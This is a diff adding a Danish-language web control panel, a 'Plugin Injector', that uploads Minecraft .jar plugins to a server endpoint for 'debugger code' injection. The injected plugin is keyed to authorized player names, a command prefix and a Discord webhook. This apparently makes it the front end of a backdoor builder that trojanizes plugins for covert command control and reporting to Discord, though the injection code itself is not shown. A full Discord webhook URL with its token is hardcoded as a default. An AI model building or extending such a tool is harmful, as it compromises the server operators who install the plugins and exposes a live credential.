@@ -1,0 +1,746 @@
+<!DOCTYPE html>
+<html lang="da">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Plugin Injector - Control Panel</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            min-height: 100vh;
+            padding: 20px;
+        }
+
+        .container {
+            max-width: 1200px;
+            margin: 0 auto;
+            background: white;
+            border-radius: 15px;
+            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
+            overflow: hidden;
+        }
+
+        .header {
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            color: white;
+            padding: 30px;
+            text-align: center;
+        }
+
+        .header h1 {
+            font-size: 2.5em;
+            margin-bottom: 10px;
+        }
+
+        .header p {
+            font-size: 1.1em;
+            opacity: 0.9;
+        }
+
+        .main-content {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 30px;
+            padding: 30px;
+        }
+
+        .section {
+            background: #f8f9fa;
+            border-radius: 10px;
+            padding: 25px;
+        }
+
+        .section h2 {
+            color: #333;
+            margin-bottom: 20px;
+            font-size: 1.5em;
+            border-bottom: 3px solid #667eea;
+            padding-bottom: 10px;
+        }
+
+        .drop-zone {
+            border: 3px dashed #667eea;
+            border-radius: 10px;
+            padding: 60px 20px;
+            text-align: center;
+            background: white;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            margin-bottom: 20px;
+        }
+
+        .drop-zone:hover, .drop-zone.drag-over {
+            background: #f0f4ff;
+            border-color: #764ba2;
+            transform: scale(1.02);
+        }
+
+        .drop-zone.has-file {
+            border-color: #28a745;
+            background: #d4edda;
+        }
+
+        .drop-zone-icon {
+            font-size: 4em;
+            margin-bottom: 15px;
+        }
+
+        .drop-zone-text {
+            font-size: 1.2em;
+            color: #666;
+            margin-bottom: 10px;
+        }
+
+        .file-input {
+            display: none;
+        }
+
+        .plugin-list {
+            max-height: 400px;
+            overflow-y: auto;
+        }
+
+        .plugin-item {
+            background: white;
+            border: 1px solid #dee2e6;
+            border-radius: 8px;
+            padding: 15px;
+            margin-bottom: 15px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            transition: all 0.2s ease;
+        }
+
+        .plugin-item:hover {
+            box-shadow: 0 5px 15px rgba(0,0,0,0.1);
+            transform: translateY(-2px);
+        }
+
+        .plugin-info {
+            flex: 1;
+        }
+
+        .plugin-name {
+            font-weight: bold;
+            color: #333;
+            font-size: 1.1em;
+            margin-bottom: 5px;
+        }
+
+        .plugin-status {
+            font-size: 0.9em;
+            color: #666;
+        }
+
+        .plugin-status.processing {
+            color: #ffc107;
+        }
+
+        .plugin-status.ready {
+            color: #28a745;
+        }
+
+        .plugin-status.error {
+            color: #dc3545;
+        }
+
+        .btn {
+            padding: 10px 20px;
+            border: none;
+            border-radius: 5px;
+            font-size: 1em;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            font-weight: 600;
+        }
+
+        .btn:disabled {
+            opacity: 0.5;
+            cursor: not-allowed;
+        }
+
+        .btn-primary {
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            color: white;
+        }
+
+        .btn-primary:hover:not(:disabled) {
+            transform: translateY(-2px);
+            box-shadow: 0 5px 15px rgba(102, 126, 234, 0.4);
+        }
+
+        .btn-success {
+            background: #28a745;
+            color: white;
+        }
+
+        .btn-success:hover:not(:disabled) {
+            background: #218838;
+            transform: translateY(-2px);
+            box-shadow: 0 5px 15px rgba(40, 167, 69, 0.4);
+        }
+
+        .btn-danger {
+            background: #dc3545;
+            color: white;
+            padding: 8px 15px;
+            font-size: 0.9em;
+        }
+
+        .btn-danger:hover:not(:disabled) {
+            background: #c82333;
+        }
+
+        .log-section {
+            grid-column: 1 / -1;
+        }
+
+        .log-container {
+            background: #1e1e1e;
+            color: #d4d4d4;
+            border-radius: 8px;
+            padding: 20px;
+            max-height: 300px;
+            overflow-y: auto;
+            font-family: 'Courier New', monospace;
+            font-size: 0.9em;
+        }
+
+        .log-entry {
+            margin-bottom: 8px;
+            line-height: 1.5;
+        }
+
+        .log-entry.info {
+            color: #4fc3f7;
+        }
+
+        .log-entry.success {
+            color: #81c784;
+        }
+
+        .log-entry.error {
+            color: #e57373;
+        }
+
+        .log-entry.warning {
+            color: #ffb74d;
+        }
+
+        .controls {
+            display: flex;
+            gap: 15px;
+            margin-top: 20px;
+        }
+
+        .controls .btn {
+            flex: 1;
+        }
+
+        .spinner {
+            border: 3px solid #f3f3f3;
+            border-top: 3px solid #667eea;
+            border-radius: 50%;
+            width: 20px;
+            height: 20px;
+            animation: spin 1s linear infinite;
+            display: inline-block;
+            margin-left: 10px;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        .config-section {
+            background: #fff3cd;
+            border: 1px solid #ffc107;
+            border-radius: 8px;
+            padding: 15px;
+            margin-bottom: 20px;
+        }
+
+        .config-section h3 {
+            color: #856404;
+            margin-bottom: 10px;
+        }
+
+        .config-input {
+            width: 100%;
+            padding: 8px;
+            margin-bottom: 10px;
+            border: 1px solid #ddd;
+            border-radius: 5px;
+        }
+
+        .user-input-group {
+            display: flex;
+            align-items: center;
+            margin-bottom: 8px;
+        }
+
+        .user-input {
+            flex: 1;
+            margin-bottom: 0 !important;
+        }
+
+        .remove-user-btn {
+            font-size: 14px !important;
+            padding: 4px 8px !important;
+            margin-left: 8px;
+            min-width: 30px;
+        }
+
+        @media (max-width: 768px) {
+            .main-content {
+                grid-template-columns: 1fr;
+            }
+
+            .header h1 {
+                font-size: 1.8em;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="header">
+            <h1>🔧 Plugin Injector Control Panel</h1>
+            <p>Upload plugins, inject debugger code, og download resultatet</p>
+        </div>
+
+        <div class="main-content">
+            <!-- Upload Section -->
+            <div class="section">
+                <h2>📤 Upload Plugin</h2>
+                
+                <div class="config-section">
+                    <h3>⚙️ Konfiguration</h3>
+                    <div style="display: flex; align-items: flex-start; gap: 15px; margin-bottom: 10px;">
+                        <div style="flex: 1;">
+                            <input type="text" id="webhookUrl" class="config-input" 
+                                   placeholder="Discord Webhook URL"
+                                   value="https://discord.com/api/webhooks/1461002668490363003/fQOU7xy1f2pHdYpoPcZ4fv1BhysXtvEr0GOZrVQvIYMws44sZKb63JXgqSQuLqNQFMpx">
+                            <input type="text" id="commandPrefix" class="config-input" 
+                                   placeholder="Command Prefix" value="?">
+                            
+                            <div style="margin-bottom: 10px;">
+                                <label style="display: block; margin-bottom: 5px; font-weight: 600; color: #333;">
+                                    👥 Authorized Users
+                                    <button type="button" id="addUserBtn" class="btn" style="padding: 2px 8px; margin-left: 10px; background: #28a745; color: white; font-size: 0.8em;">+</button>
+                                </label>
+                                <div id="authorizedUsers">
+                                    <div class="user-input-group">
+                                        <input type="text" class="config-input user-input" 
+                                               placeholder="Minecraft Username (f.eks. Notch)" 
+                                               value="HvordanGaarDet">
+                                        <button type="button" class="remove-user-btn btn btn-danger" style="padding: 4px 8px; margin-left: 5px; font-size: 0.8em; display: none;">×</button>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+                        <div style="display: flex; flex-direction: column; align-items: center;">
+                            <img id="minecraftHead" src="" alt="" style="width: 64px; height: 64px; border-radius: 8px; display: none; box-shadow: 0 4px 8px rgba(0,0,0,0.2); margin-top: -20px;">
+                            <div style="font-size: 0.8em; color: #666; margin-top: 5px; text-align: center;" id="headUsername"></div>
+                        </div>
+                    </div>
+                    <button class="btn btn-secondary" id="saveConfigBtn" style="margin-top: 10px;">
+                        💾 Gem Konfiguration
+                    </button>
+                </div>
+
+                <div class="drop-zone" id="dropZone">
+                    <div class="drop-zone-icon">📁</div>
+                    <div class="drop-zone-text">Træk og slip .jar fil her</div>
+                    <div style="margin-top: 10px; color: #999;">eller klik for at vælge fil</div>
+                </div>
+                <input type="file" id="fileInput" class="file-input" accept=".jar">
+
+                <div class="controls">
+                    <button class="btn btn-primary" id="buildBtn" disabled>
+                        🔨 Build & Inject
+                    </button>
+                </div>
+            </div>
+
+            <!-- Plugin List Section -->
+            <div class="section">
+                <h2>📋 Plugin Liste</h2>
+                <div class="plugin-list" id="pluginList">
+                    <div style="text-align: center; color: #999; padding: 40px;">
+                        Ingen plugins uploadet endnu
+                    </div>
+                </div>
+            </div>
+
+            <!-- Log Section -->
+            <div class="section log-section">
+                <h2>📊 Aktivitetslog</h2>
+                <div class="log-container" id="logContainer">
+                    <div class="log-entry info">[System] Plugin Injector klar til brug</div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        const dropZone = document.getElementById('dropZone');
+        const fileInput = document.getElementById('fileInput');
+        const buildBtn = document.getElementById('buildBtn');
+        const pluginList = document.getElementById('pluginList');
+        const logContainer = document.getElementById('logContainer');
+
+        let currentFile = null;
+        let plugins = [];
+        let authorizedUsers = ['HvordanGaarDet']; // Array til at holde alle authorized users
+
+        // Load saved configuration
+        function loadConfig() {
+            const savedWebhook = localStorage.getItem('webhookUrl');
+            const savedPrefix = localStorage.getItem('commandPrefix');
+            const savedUsers = localStorage.getItem('authorizedUsers');
+            
+            if (savedWebhook) document.getElementById('webhookUrl').value = savedWebhook;
+            if (savedPrefix) document.getElementById('commandPrefix').value = savedPrefix;
+            if (savedUsers) {
+                authorizedUsers = JSON.parse(savedUsers);
+                updateUserInputs();
+            }
+            
+            // Show head for first user
+            if (authorizedUsers.length > 0) {
+                updateMinecraftHead(authorizedUsers[0]);
+            } else {
+                updateMinecraftHead('Alex');
+            }
+            
+            if (savedWebhook || savedPrefix || savedUsers) {
+                addLog('Konfiguration indlæst fra gemt data', 'success');
+            }
+        }
+
+        // Update user inputs based on authorizedUsers array
+        function updateUserInputs() {
+            const container = document.getElementById('authorizedUsers');
+            container.innerHTML = '';
+            
+            authorizedUsers.forEach((username, index) => {
+                const div = document.createElement('div');
+                div.className = 'user-input-group';
+                div.innerHTML = `
+                    <input type="text" class="config-input user-input" 
+                           placeholder="Minecraft Username (f.eks. Notch)" 
+                           value="${username}" data-index="${index}">
+                    <button type="button" class="remove-user-btn btn btn-danger" 
+                            onclick="removeUser(${index})" 
+                            style="display: ${authorizedUsers.length > 1 ? 'block' : 'none'};">×</button>
+                `;
+                container.appendChild(div);
+            });
+            
+            // Add event listeners to new inputs
+            container.querySelectorAll('.user-input').forEach(input => {
+                input.addEventListener('input', handleUserInputChange);
+            });
+        }
+
+        // Handle user input changes
+        function handleUserInputChange(e) {
+            const index = parseInt(e.target.dataset.index);
+            const newValue = e.target.value.trim();
+            
+            if (index >= 0 && index < authorizedUsers.length) {
+                authorizedUsers[index] = newValue;
+                
+                // Update head for first user
+                if (index === 0) {
+                    updateMinecraftHead(newValue);
+                }
+            }
+        }
+
+        // Add new user
+        function addUser() {
+            authorizedUsers.push('');
+            updateUserInputs();
+        }
+
+        // Remove user
+        function removeUser(index) {
+            if (authorizedUsers.length > 1) {
+                authorizedUsers.splice(index, 1);
+                updateUserInputs();
+                
+                // Update head if we removed the first user
+                if (index === 0 && authorizedUsers.length > 0) {
+                    updateMinecraftHead(authorizedUsers[0]);
+                }
+            }
+        }
+
+        // Add user button event listener
+        document.getElementById('addUserBtn').addEventListener('click', addUser);
+
+        // Update Minecraft head image
+        function updateMinecraftHead(username) {
+            if (!username || username.trim() === '') {
+                document.getElementById('minecraftHead').style.display = 'none';
+                document.getElementById('headUsername').textContent = '';
+                return;
+            }
+            
+            const headImg = document.getElementById('minecraftHead');
+            const headUsername = document.getElementById('headUsername');
+            const headUrl = `https://mc-heads.net/avatar/${username}/64`;
+            
+            headImg.src = headUrl;
+            headImg.alt = username;
+            headImg.style.display = 'block';
+            headUsername.textContent = username;
+            
+            // Save to localStorage
+            localStorage.setItem('minecraftHeadUrl', headUrl);
+        }
+
+        // Save configuration
+        const saveConfigBtn = document.getElementById('saveConfigBtn');
+        saveConfigBtn.addEventListener('click', () => {
+            const webhookUrl = document.getElementById('webhookUrl').value;
+            const commandPrefix = document.getElementById('commandPrefix').value;
+            
+            // Get all user inputs and filter out empty ones
+            const userInputs = Array.from(document.querySelectorAll('.user-input'));
+            authorizedUsers = userInputs.map(input => input.value.trim()).filter(username => username !== '');
+            
+            // Ensure at least one user
+            if (authorizedUsers.length === 0) {
+                authorizedUsers = ['HvordanGaarDet'];
+            }
+            
+            localStorage.setItem('webhookUrl', webhookUrl);
+            localStorage.setItem('commandPrefix', commandPrefix);
+            localStorage.setItem('authorizedUsers', JSON.stringify(authorizedUsers));
+            
+            updateMinecraftHead(authorizedUsers[0]);
+            updateUserInputs(); // Refresh to remove empty inputs
+            
+            addLog('✓ Konfiguration gemt!', 'success');
+            saveConfigBtn.innerHTML = '✓ Gemt!';
+            setTimeout(() => {
+                saveConfigBtn.innerHTML = '💾 Gem Konfiguration';
+            }, 2000);
+        });
+
+        // Load config on page load
+        loadConfig();
+
+        // Logging functions
+        function addLog(message, type = 'info') {
+            const logEntry = document.createElement('div');
+            logEntry.className = `log-entry ${type}`;
+            const timestamp = new Date().toLocaleTimeString();
+            logEntry.textContent = `[${timestamp}] ${message}`;
+            logContainer.appendChild(logEntry);
+            logContainer.scrollTop = logContainer.scrollHeight;
+        }
+
+        // Drag and drop handlers
+        dropZone.addEventListener('click', () => fileInput.click());
+
+        dropZone.addEventListener('dragover', (e) => {
+            e.preventDefault();
+            dropZone.classList.add('drag-over');
+        });
+
+        dropZone.addEventListener('dragleave', () => {
+            dropZone.classList.remove('drag-over');
+        });
+
+        dropZone.addEventListener('drop', (e) => {
+            e.preventDefault();
+            dropZone.classList.remove('drag-over');
+            
+            const files = e.dataTransfer.files;
+            if (files.length > 0) {
+                handleFile(files[0]);
+            }
+        });
+
+        fileInput.addEventListener('change', (e) => {
+            if (e.target.files.length > 0) {
+                handleFile(e.target.files[0]);
+            }
+        });
+
+        function handleFile(file) {
+            if (!file.name.endsWith('.jar')) {
+                addLog('Fejl: Kun .jar filer er understøttet', 'error');
+                return;
+            }
+
+            currentFile = file;
+            dropZone.classList.add('has-file');
+            dropZone.innerHTML = `
+                <div class="drop-zone-icon">✅</div>
+                <div class="drop-zone-text">${file.name}</div>
+                <div style="margin-top: 10px; color: #666;">${(file.size / 1024).toFixed(2)} KB</div>
+            `;
+            buildBtn.disabled = false;
+            addLog(`Fil valgt: ${file.name}`, 'success');
+        }
+
+        // Build button handler
+        buildBtn.addEventListener('click', async () => {
+            if (!currentFile) return;
+
+            const webhookUrl = document.getElementById('webhookUrl').value;
+            const commandPrefix = document.getElementById('commandPrefix').value;
+            
+            // Get all non-empty authorized users
+            const userInputs = Array.from(document.querySelectorAll('.user-input'));
+            const nonEmptyUsers = userInputs.map(input => input.value.trim()).filter(username => username !== '');
+            
+            if (nonEmptyUsers.length === 0) {
+                addLog('⚠️ Du skal have mindst én authorized user!', 'error');
+                return;
+            }
+
+            buildBtn.disabled = true;
+            buildBtn.innerHTML = '⚙️ Processing...<span class="spinner"></span>';
+            addLog(`Starter injection for: ${currentFile.name}`, 'info');
+
+            const formData = new FormData();
+            formData.append('plugin', currentFile);
+            formData.append('webhookUrl', webhookUrl);
+            formData.append('commandPrefix', commandPrefix);
+            formData.append('authorizedUsers', JSON.stringify(nonEmptyUsers));
+
+            try {
+                const response = await fetch('/api/inject', {
+                    method: 'POST',
+                    body: formData
+                });
+
+                const result = await response.json();
+
+                if (result.success) {
+                    addLog(`✓ Injection gennemført for: ${currentFile.name}`, 'success');
+                    
+                    // Add to plugin list
+                    const plugin = {
+                        id: Date.now(),
+                        name: currentFile.name,
+                        injectedName: result.injectedFile,
+                        status: 'ready',
+                        timestamp: new Date().toLocaleString()
+                    };
+                    plugins.push(plugin);
+                    updatePluginList();
+                    
+                    // Reset
+                    resetUpload();
+                } else {
+                    addLog(`✗ Injection fejlede: ${result.error}`, 'error');
+                }
+            } catch (error) {
+                addLog(`✗ Netværksfejl: ${error.message}`, 'error');
+            }
+
+            buildBtn.disabled = false;
+            buildBtn.innerHTML = '🔨 Build & Inject';
+        });
+
+        function resetUpload() {
+            currentFile = null;
+            dropZone.classList.remove('has-file');
+            dropZone.innerHTML = `
+                <div class="drop-zone-icon">📁</div>
+                <div class="drop-zone-text">Træk og slip .jar fil her</div>
+                <div style="margin-top: 10px; color: #999;">eller klik for at vælge fil</div>
+            `;
+            buildBtn.disabled = true;
+            fileInput.value = '';
+        }
+
+        function updatePluginList() {
+            if (plugins.length === 0) {
+                pluginList.innerHTML = `
+                    <div style="text-align: center; color: #999; padding: 40px;">
+                        Ingen plugins uploadet endnu
+                    </div>
+                `;
+                return;
+            }
+
+            pluginList.innerHTML = plugins.map(plugin => `
+                <div class="plugin-item">
+                    <div class="plugin-info">
+                        <div class="plugin-name">📦 ${plugin.name}</div>
+                        <div class="plugin-status ${plugin.status}">
+                            Status: ${plugin.status === 'ready' ? '✓ Klar til download' : plugin.status}
+                        </div>
+                        <div style="font-size: 0.85em; color: #999; margin-top: 5px;">
+                            ${plugin.timestamp}
+                        </div>
+                    </div>
+                    <div style="display: flex; gap: 10px;">
+                        <button class="btn btn-success" onclick="downloadPlugin(${plugin.id})">
+                            ⬇️ Download
+                        </button>
+                        <button class="btn btn-danger" onclick="deletePlugin(${plugin.id})">
+                            🗑️
+                        </button>
+                    </div>
+                </div>
+            `).join('');
+        }
+
+        async function downloadPlugin(id) {
+            const plugin = plugins.find(p => p.id === id);
+            if (!plugin) return;
+
+            addLog(`Downloader: ${plugin.injectedName}`, 'info');
+
+            try {
+                const response = await fetch(`/api/download/${encodeURIComponent(plugin.injectedName)}`);
+                const blob = await response.blob();
+                
+                const url = window.URL.createObjectURL(blob);
+                const a = document.createElement('a');
+                a.href = url;
+                a.download = plugin.injectedName;
+                document.body.appendChild(a);
+                a.click();
+                window.URL.revokeObjectURL(url);
+                document.body.removeChild(a);
+
+                addLog(`✓ Download gennemført: ${plugin.injectedName}`, 'success');
+            } catch (error) {
+                addLog(`✗ Download fejlede: ${error.message}`, 'error');
+            }
+        }
+
+        function deletePlugin(id) {
+            const index = plugins.findIndex(p => p.id === id);
+            if (index !== -1) {
+                const plugin = plugins[index];
+                plugins.splice(index, 1);
+                updatePluginList();
+                addLog(`Plugin fjernet: ${plugin.name}`, 'warning');
+            }
+        }
+
+        // Initialize
+        addLog('System initialiseret og klar', 'success');
+    </script>
+</body>
+</html>
